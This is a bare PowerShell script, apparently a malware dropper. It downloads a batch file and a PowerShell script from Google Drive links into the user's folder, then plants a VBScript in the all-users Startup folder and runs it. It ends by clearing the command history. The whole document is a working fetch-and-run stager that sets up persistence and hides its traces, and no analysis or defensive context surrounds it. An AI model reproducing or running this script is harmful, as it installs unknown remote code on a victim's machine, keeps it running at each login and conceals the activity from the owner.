cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1t2Xiak01nRn99QYZ42Qd5BG2mkVAAdTh" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1F1Xa-PekvOqyIeW4ylNKN6EOo8a_E9VD" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=175m23ePIv4YRP3Y09V8m_m-1FcqQ-vHE" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit